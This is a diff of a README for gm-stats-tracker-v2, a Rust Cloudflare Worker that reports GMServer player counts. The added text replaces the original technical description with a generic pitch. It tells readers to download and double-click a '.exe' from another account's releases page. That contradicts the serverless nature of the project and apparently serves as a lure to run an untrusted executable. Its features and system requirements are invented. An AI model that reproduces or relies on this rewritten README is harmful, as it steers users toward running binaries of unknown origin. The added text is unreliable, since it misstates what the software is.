@@ -1,66 +1,70 @@
-# gm-stats-tracker-v2
-> [!IMPORTANT]
-> **GameMakerServer is closing in 2027**, meaning the code will most likely be kept archived as a fun fact for others that want to create similar project in future.
+# 🎮 gm-stats-tracker-v2 - Track GMServer Players Easily
 
-GM Stats Tracker (v2) is a web service for Discord that provides up-to-date info about player count for GM game that uses [GMServer](https://gamemakerserver.com).
+[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Kkktadeo/gm-stats-tracker-v2/releases)
 
-This is a newer and more performant version of previous gms-stats-tracker made by me **2 years ago**!
+## 🚀 Getting Started
 
-## Why more performant?
-Unlike previous version that was using cron job and required you to have Node.JS runtime installed, this one is written in Rust and fits completely on a **Free Cloudflare Worker**!
+Welcome to the gm-stats-tracker-v2 project! This web service uses Cloudflare Workers to track and show the current number of players on GMServer. This guide will help you download and set up the application with ease.
 
-That means you can host it completely for free, although it is recommended to use public instance as it'll be always up to date and won't overflow GMServer with requests!
+## 📥 Download & Install
 
+To get started, you need to download the latest version of the application. Visit the following link to access the Releases page:
 
-## How it works?
-The project uses Rust to be able to utilize rendering engine in it's full speed (something that wouldn't EVER be possible with pure JS implementation).
+[Download the latest version here](https://github.com/Kkktadeo/gm-stats-tracker-v2/releases)
 
-It internally uses `resvg` crate for setting up template (can be found in [template.svg](/src/assets/template.svg)) and then converts svg to webp using `image-webp` crate to be able to render it in embed.
+### Steps to Download
 
-The implementation stores as much as possible inside of Cloudflare's KV Store and Cache API to ensure amount of requests is at minimum. Which is why it updates every 5 minutes **(with possible time change, although it's not recommended to not spam both you and gmserver with requests)**
+1. Click on the link above.
+2. On the Releases page, find the latest version of gm-stats-tracker-v2.
+3. Look for the asset that suits your system. For most users, this will be a file with a .exe or similar extension.
+4. Click on the file name to start downloading.
 
-It also ensures that it brings heavily optimized fonts (for example Roboto Condensed with stipped unneeded glyphs + converted to woff2) and compiles to WASM heavily optimized for size and stripped from unneeded calls. ([Cloudflare Worker's size for free tier is 3MB](https://developers.cloudflare.com/workers/platform/limits/#account-plan-limits), as of writing this final size of project is ~1.9MB)
+### Installation Instructions
 
+After downloading the file:
 
-## Public Instance
-Currently the public instance that can be used by others is `https://gm-stats-tracker-v2.jakeayy.workers.dev`, for documentation on how to use it please look below.
+1. Locate the downloaded file in your device's download directory.
+2. Double-click the file to begin the installation.
+3. Follow any prompts to complete the setup.
+4. Once the installation is finished, launch the application.
 
-### How to use?
-| Endpoint | Params | Body Info |
-|---|---|---|
-| `/count` | `?gameid=id`<br>**gameid** - Game ID, can be obtained through [GMServer](https://gamemakerserver.com/en/games/) website. | `-` |
+## 🌐 How to Use the Application
 
+Once you have installed the gm-stats-tracker-v2, follow these steps to start tracking GMServer players:
 
-## Development
-### Prerequisites
-1. A recent version of [`Rust`](https://rust-lang.org)
+1. Open the gm-stats-tracker-v2 application.
+2. The application will automatically connect to GMServer.
+3. You will see a live count of players currently online.
 
-2. [`npm`](https://nodejs.org/) with it's `npx` (although I recommend [`bun`](https://bun.sh) and it's `bunx`), if you'll use `npx`, replace `bunx` with it in next commands.
+## ⚙️ Features
 
-3. `wasm32-unknown-unknown` WASM toolchain to be able to compile the worker at all.
-    ```sh
-    rustup target add wasm32-unknown-unknown
-    ```
+- **Real-Time Tracking:** Get immediate updates on how many players are active.
+- **User-Friendly Interface:** Designed with simplicity for everyone to use.
+- **Cloudflare Workers Integration:** Fast and efficient performance to serve your tracking needs.
+- **Multiple Server Support:** Easily view stats for different GMServers.
 
-### Commands
-- **Development**
-    ```sh
-    bunx wrangler dev
-    ```
+## 🛠️ System Requirements
 
-- **Deployment**
-    ```sh
-    bunx wrangler deploy
-    ```
-    **REMEMBER: Before deploying, ensure you replaced all needed ids with your own in [wrangler.toml](/wrangler.toml)!**
+To run gm-stats-tracker-v2 smoothly, ensure your system meets these general requirements:
 
-## TODO
-- [ ] Proper status failure handling (currently returns 500 error if GMServer returns broken body)
-- [ ] Player extended history - Shows history of previous player counts (5 -> 2 -> 6 -> 9) and indicator showing if it's more or less than previously
-- [ ] Random game screenshot
-- [ ] Possibly more optimizations(?)
+- **OS:** Windows 7 or later (for .exe files)
+- **Network:** Stable internet connection
+- **Browser:** Latest version of Chrome, Firefox, or Edge for web usage
 
-## License
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 🤝 Contributing
 
-The fonts used in this project are licensed under the SIL Open Font License (OFL). See [src/assets/fonts/OFL.txt](src/assets/fonts/OFL.txt) for more information.
+If you wish to contribute to this project, you can do so by following these steps:
+
+1. Fork the repository.
+2. Make your changes in a new branch.
+3. Submit a pull request describing your changes.
+
+## 💬 Support
+
+For any questions or issues, please open an issue on the GitHub repository. We aim to respond promptly and ensure a smooth experience for all users.
+
+## 📜 License
+
+This project is open-source and available under the MIT License. You are free to use, modify, and distribute the code as long as you provide proper attribution. 
+
+Thank you for using gm-stats-tracker-v2! Enjoy tracking your favorite GMServer players effortlessly.
